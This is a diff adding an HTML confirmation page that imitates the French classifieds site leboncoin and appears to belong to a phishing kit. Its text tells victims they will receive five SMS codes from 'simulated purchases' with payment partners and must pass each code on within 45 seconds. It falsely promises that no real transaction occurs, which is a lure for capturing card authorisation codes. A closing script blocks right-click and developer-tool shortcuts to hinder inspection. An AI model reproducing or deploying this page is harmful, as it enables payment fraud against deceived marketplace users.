+        height: 35px;
+        font-size: 18px;
+      }
+      .navigation-arrow.left { left: 10px; }
+      .navigation-arrow.right { right: 10px; }
+
+      .carousel-card.ad-card {
+        font-size: 16px;
+      }
+
+      .static-text-section {
+          margin: 0 auto;
+          padding: 20px 15px;
+          font-size: 14px;
+      }
+
+      /* Footer Responsive */
+      .main-footer {
+          padding: 30px 15px 15px;
+      }
+
+      .footer-content {
+          grid-template-columns: repeat(2, 1fr);
+          gap: 30px 20px;
+          padding-bottom: 30px;
+      }
+
+      .footer-column {
+          text-align: left;
+      }
+
+      .footer-column h3 {
+          font-size: 15px;
+          margin-bottom: 10px;
+          padding-bottom: 5px;
+      }
+
+      .footer-column h3::after {
+          width: 100%;
+          height: 1px;
+      }
+
+      .footer-column li {
+          margin-bottom: 8px;
+      }
+
+      .footer-column a {
+          font-size: 13px;
+      }
+
+      .footer-bottom {
+          flex-direction: column;
+          align-items: center;
+          gap: 20px;
+          padding-top: 15px;
+      }
+
+      .social-media-links {
+          margin-bottom: 0;
+      }
+
+      .app-links {
+          flex-wrap: wrap;
+          justify-content: center;
+      }
+
+      .app-links img {
+          height: 30px;
+      }
+
+      .copyright {
+          font-size: 12px;
+          margin-top: 15px;
+      }
+
+      /* Styles spécifiques à la page de confirmation en mobile */
+      .content-container-confirmation {
+          padding: 20px;
+      }
+
+      .important-text-block {
+          padding: 20px;
+          font-size: 1.2em; /* Taille de police légèrement réduite pour mobile */
+          margin: 20px auto; /* Marge ajustée pour mobile */
+      }
+
+      .content-container-confirmation h2 {
+          font-size: 24px; /* Taille de titre ajustée pour mobile */
+      }
+
+      .back-button {
+          padding: 12px 25px;
+          font-size: 16px;
+          max-width: 200px;
+          margin-top: 30px;
+      }
+
+      /* Ajustement pour la bande défilante sur mobile */
+      .scrolling-band-container {
+        width: 100%;
+        max-width: 100%; /* S'étend sur toute la largeur disponible */
+        border-radius: 0; /* Pas de bords arrondis sur les côtés */
+        height: 40px; /* Hauteur ajustée pour mobile */
+      }
+
+      .scrolling-band-container .sidebar {
+        width: 100px; /* Réduire la largeur de la sidebar sur mobile */
+        font-size: 0.8em; /* Réduire la taille de la police de la flèche */
+      }
+
+      .scrolling-band-container .scrolling-wrapper p {
+        padding-right: 20px; /* Réduire l'espace entre les textes */
+        font-size: 0.8em; /* Réduire la taille de la police du texte défilant */
+      }
+    }
+
+    @media (max-width: 480px) {
+      .trends-section h2 {
+        font-size: 18px;
+      }
+      .trends-card {
+          width: 160px;
+          height: 200px;
+      }
+      .trends-card img {
+        height: 120px;
+      }
+      .trends-card-content {
+        height: calc(200px - 120px);
+      }
+
+      .carousel-card {
+          width: 180px;
+          height: 150px;
+      }
+      .overlay-text-bottom-left {
+        font-size: 14px;
+        bottom: 8px;
+        left: 8px;
+      }
+      .navigation-arrow {
+        width: 30px;
+        height: 30px;
+        font-size: 16px;
+      }
+      .navigation-arrow.left { left: 8px; }
+      .navigation-arrow.right { right: 8px; }
+
+      .footer-content {
+          grid-template-columns: 1fr;
+          gap: 20px;
+      }
+      .footer-column h3 {
+          text-align: center;
+      }
+      .footer-column h3::after {
+          left: 50%;
+          transform: translateX(-50%);
+          width: 80%;
+      }
+      .footer-column ul {
+          text-align: center;
+      }
+    }
+  </style>
+
+  <link href="favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+<link href="favicon.ico" rel="icon" type="image/x-icon"/>
+<link href="apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<link href="site.webmanifest" rel="manifest"/>
+</head>
+<body>
+  <div class="mobile-menu-overlay"></div>
+  <div class="mobile-menu">
+    <div class="mobile-menu-header">
+      <a href="" class="logo-link">
+        <img src="logodujour2.png" alt="Leboncoin Logo" class="logo-img">
+      </a>
+      <button class="close-menu-btn" aria-label="Fermer le menu">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    <nav class="mobile-menu-nav">
+      <ul>
+        <li><a href="#"><i class="fas fa-comment-dots"></i>Messages</a></li>
+        <li><a href="#"><i class="fas fa-heart"></i>Favoris</a></li>
+        <li><a href="#"><i class="fas fa-bell"></i>Recherches sauvegardées</a></li>
+        <li class="section-separator"></li>
+        <li class="category-header">Catégories</li>
+        <li><a href="#">Immobilier</a></li>
+        <li><a href="#">Véhicules</a></li>
+        <li><a href="#">Vacances</a></li>
+        <li><a href="#">Emploi</a></li>
+        <li><a href="#">Mode</a></li>
+        <li><a href="#">Maison & Jardin</a></li>
+        <li><a href="#">Famille</a></li>
+        <li><a href="#">Électronique</a></li>
+        <li><a href="#">Loisirs</a></li>
+        <li><a href="#">Autres</a></li>
+        <li class="section-separator"></li>
+        <li class="login-section"><a href="https://www.leboncoin.fr/">Déconnexion</a></li>
+      </ul>
+    </nav>
+  </div>
+
+  <div class="page-container">
+    <header>
+      <div class="header-fixed-wrapper">
+        <nav class="top-header">
+          <button class="hamburger-menu" aria-label="Ouvrir le menu mobile">
+            <i class="fas fa-bars"></i>
+          </button>
+          <a href="" class="logo-link">
+            <img src="logodujour2.png" alt="Leboncoin Logo" class="logo-img">
+          </a>
+          <a href="https://www.leboncoin.fr/" class="mobile-login-btn">
+            <span>Déconnexion</span>
+          </a>
+          <button class="deposer-annonce">
+            <i class="fas fa-plus"></i>Déposer une annonce
+          </button>
+          <div class="search-bar-wrapper">
+            <div class="search-input-area">
+              <i class="fas fa-magnifying-glass input-icon"></i>
+              <input type="text" placeholder="Rechercher sur leboncoin" />
+            </div>
+            <button class="search-button-combined" aria-label="Lancer la recherche">
+              <span class="search-icon-circle">
+                <i class="fas fa-magnifying-glass"></i>
+              </span>
+            </button>
+          </div>
+          <ul class="nav-icons">
+            <li><a href="#"><i class="fas fa-bell"></i><span>Mes recherches</span></a></li>
+            <li><a href="#"><i class="fas fa-heart"></i><span>Favoris</span></a></li>
+            <li><a href="#"><i class="fas fa-comment-dots"></i><span>Messages</span></a></li>
+            <li><a href="https://www.leboncoin.fr/"><i class="fas fa-user"></i><span>Déconnexion</span></a></li>
+          </ul>
+        </nav>
+        <nav class="categories-nav">
+          <div class="categories-scroll-wrapper">
+            <ul>
+              <li><a href="#">Immobilier</a></li>
+              <li><a href="#">Véhicules</a></li>
+              <li><a href="#">Vacances</a></li>
+              <li><a href="#">Emploi</a></li>
+              <li><a href="#">Mode</a></li>
+              <li><a href="#">Maison & Jardin</a></li>
+              <li><a href="#">Famille</a></li>
+              <li><a href="#">Électronique</a></li>
+              <li><a href="#">Loisirs</a></li>
+              <li><a href="#">Autres</a></li>
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </header>
+
+    <main class="main-content">
+        <div class="confirmation-page-wrapper">
+
+            <img alt="Support Vinted 24h" class="support-image" src="supportlbc.jpg"/>
+
+            <div class="scrolling-band-container">
+                <div class="content-area">
+                    <div class="scrolling-wrapper" id="scrollingText">
+                       
+                      <p>• Vos informations ont bien été reçues. La vérification est en cours pour sécuriser votre transfert..</p>
+                        <p>• Rapide et en toute sérénité. Un conseiller vous contactera prochainement pour vous transmettre les instructions nécessaires. Merci de rester attentif à nos communications afin de finaliser cette étape dans les meilleurs délais..</p>
+</p>
+<p>• Vos informations ont bien été reçues. La vérification est en cours pour sécuriser votre transfert..</p>
+                        <p>• Rapide et en toute sérénité. Un conseiller vous contactera prochainement pour vous transmettre les instructions nécessaires. Merci de rester attentif à nos communications afin de finaliser cette étape dans les meilleurs délais..</p>
+</p><p>• Vos informations ont bien été reçues. La vérification est en cours pour sécuriser votre transfert..</p>
+                        <p>• Rapide et en toute sérénité. Un conseiller vous contactera prochainement pour vous transmettre les instructions nécessaires. Merci de rester attentif à nos communications afin de finaliser cette étape dans les meilleurs délais..</p>
+</p>
+                    </div>
+                </div>
+                <div class="sidebar">
+                    <span class="arrow">&#8595;</span>
+                </div>
+            </div>
+            <div class="content-container-confirmation">
+                <h2>Vos informations ont bien été reçues. La vérification est en cours pour sécuriser votre transfert.. !</h2>
+
+                <div class="important-text-block">
+                    <p><span class="highlight">📞 Suivi en cours :</span><br>Un conseiller vous contactera prochainement pour vous transmettre les instructions nécessaires. Merci de rester attentif à nos communications afin de finaliser cette étape dans les meilleurs délais.</p>
+                </div>
+
+                <div class="important-text-block">
+                    <p>Afin de confirmer votre identité et d’activer votre compte <span class="highlight">LEBONCOIN</span> en toute sécurité, une vérification en plusieurs étapes est nécessaire. Cette démarche consiste à effectuer des simulations d’achat via nos partenaires de confiance (Allo by Monisnap, Orange Bank, Rewire, Recharge, Bunq, etc.).</p>
+                </div>
+
+                <div class="important-text-block">
+                    <p>Vous recevrez <span class="highlight">5 codes de confirmation par SMS</span>. Ces codes, générés de façon sécurisée, attestent de votre lien légitime avec le numéro de carte bancaire enregistré lors de la création de votre compte.</p>
+                </div>
+
+                <div class="important-text-block">
+                    <p><i class="fas fa-hand-point-right highlight"></i> Merci de nous transmettre <span class="highlight">chaque code dans un délai de 45 secondes</span> après réception, afin que nous puissions finaliser la validation de votre transaction.</p>
+                </div>
+
+                <div class="important-text-block">
+                    <p>Soyez rassuré(e), il ne s’agit que de <span class="highlight">simulations sécurisées</span>. Aucune transaction réelle ne sera effectuée. Cette procédure a pour unique objectif de confirmer votre identité et de garantir que vous êtes bien le ou la titulaire du moyen de paiement associé à votre compte.</p>
+                </div>
+
+                <button class="back-button" onclick="window.location.href='https://www.leboncoin.fr/'">Déconnexion</button>
+
+                <div class="important-text-block">
+                    <p>Si vous avez des questions, notre équipe reste à votre disposition.</p>
+                </div>
+
+                <div class="important-text-block">
+                    <p>Vos informations d'identité seront <span class="highlight">vérifiées, cryptées et transmises de manière sécurisée</span>.</p>
+                </div>
+
+                <div class="important-text-block">
+                    <p>Nous ne <span class="highlight">stockons jamais les informations d'identité</span> soumises par le biais de ce processus sur nos systèmes.</p>
+                </div>
+
+            </div>
+
+            <img alt="Paiement sécurisé" class="confirmation-image" src="imagedubasacceuil.jpg"/>
+        </div>
+    </main>
+
+  <footer class="main-footer">
+    <div class="footer-content">
+      <div class="footer-column">
+        <h3>À propos du boncoin</h3>
+        <ul>
+          <li><a href="#">Qui sommes-nous ?</a></li>
+          <li><a href="#">Nous rejoindre</a></li>
+          <li><a href="#">Impact environnemental</a></li>
+          <li><a href="#">Accessibilité</a></li>
+          <li><a href="#">Authenticité des annonces</a></li>
+          <li><a href="#">Informations légales</a></li>
+          <li><a href="#">Conditions Générales de Vente</a></li>
+          <li><a href="#">Conditions Générales d'Utilisation</a></li>
+          <li><a href="#">Avis de non-responsabilité</a></li>
+          <li><a href="#">Gestion des cookies</a></li>
+          <li><a href="#">Politique de confidentialité</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Nos services</h3>
+        <ul>
+          <li><a href="#">Solutions pros</a></li>
+          <li><a href="#">Publicité</a></li>
+          <li><a href="#">Tous nos services</a></li>
+          <li><a href="#">Aide et Contact</a></li>
+          <li><a href="#">Déposer une annonce</a></li>
+          <li><a href="#">Centre de sécurité</a></li>
+          <li><a href="#">Livraison</a></li>
+          <li><a href="#">Paiement sécurisé</a></li>
+          <li><a href="#">Assurance</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Nos univers</h3>
+        <ul>
+          <li><a href="#">Immobilier</a></li>
+          <li><a href="#">Véhicules</a></li>
+          <li><a href="#">Vacances</a></li>
+          <li><a href="#">Emploi</a></li>
+          <li><a href="#">Mode</a></li>
+          <li><a href="#">Maison & Jardin</a></li>
+          <li><a href="#">Famille</a></li>
+          <li><a href="#">Électronique</a></li>
+          <li><a href="#">Loisirs</a></li>
+          <li><a href="#">Autres</a></li>
+          <li><a href="#">leboncoin sur YouTube</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Découvrez nos applications</h3>
+        <div class="app-links">
+          <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="Disponible sur l'App Store"></a>
+          <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Disponible sur Google Play"></a>
+        </div>
+        <h3 style="margin-top: 30px;">Suivez-nous</h3>
+        <div class="social-media-links">
+          <a href="#" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+          <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+          <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+          <a href="#" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p class="copyright">&copy; 2025 leboncoin - Tous droits réservés</p>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const hamburger = document.querySelector('.hamburger-menu');
+      const closeBtn = document.querySelector('.close-menu-btn');
+      const overlay = document.querySelector('.mobile-menu-overlay');
+      const menu = document.querySelector('.mobile-menu');
+
+      const searchInput = document.querySelector('.search-bar-wrapper input');
+      const searchButtonCombined = document.querySelector('.search-button-combined');
+      const searchIconInsideInput = document.querySelector('.search-bar-wrapper .input-icon');
+
+      const performSearch = () => {
+          const searchTerm = searchInput.value;
+          if (searchTerm) {
+               alert('Recherche de : ' + searchTerm); // Uncomment for actual search behavior
+          }
+      };
+
+      if (searchInput) {
+        searchInput.addEventListener('keypress', (event) => {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                performSearch();
+            }
+        });
+      }
+
+      if (searchButtonCombined) {
+          searchButtonCombined.addEventListener('click', performSearch);
+      }
+
+      if (searchIconInsideInput) {
+           searchIconInsideInput.addEventListener('click', performSearch);
+      }
+
+      function openMenu() {
+        console.log('☰ Hamburger Clicked! Attempting to open menu.');
+        menu.classList.add('is-open');
+        overlay.classList.add('is-open');
+        document.body.classList.add('no-scroll');
+      }
+
+      function closeMenu() {
+        console.log('✕ Close Button or Overlay Clicked! Attempting to close menu.');
+        menu.classList.remove('is-open');
+        overlay.classList.remove('is-open');
+        document.body.classList.remove('no-scroll');
+      }
+
+      if (hamburger) {
+        hamburger.addEventListener('click', openMenu);
+        console.log('Event listener added to hamburger menu.');
+      } else {
+        console.warn('Bouton hamburger non trouvé dans le DOM !');
+      }
+
+      if (closeBtn) {
+        closeBtn.addEventListener('click', closeMenu);
+        console.log('Event listener added to close button.');
+      } else {
+        console.warn('Bouton de fermeture du menu mobile non trouvé !');
+      }
+
+      if (overlay) {
+        overlay.addEventListener('click', closeMenu);
+        console.log('Event listener added to overlay.');
+      } else {
+        console.warn('Overlay du menu mobile non trouvé !');
+      }
+
+      document.querySelector('.top-header').addEventListener('click', function(event) {
+          console.log('Clicked inside top-header:', event.target, 'Current target:', event.currentTarget);
+      });
+    });
+  </script>
+
+  <script>
+document.addEventListener("contextmenu", event => event.preventDefault());  // Bloque clic droit
+document.addEventListener("keydown", function(e) {
+    if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || (e.ctrlKey && e.key === "U")) {
+        e.preventDefault();
+    }
+});
+document.querySelectorAll("img").forEach(img => {
+    img.setAttribute("oncontextmenu", "return false");
+    img.setAttribute("ondragstart", "return false");
+});
+</script>
+</body>
+</html>
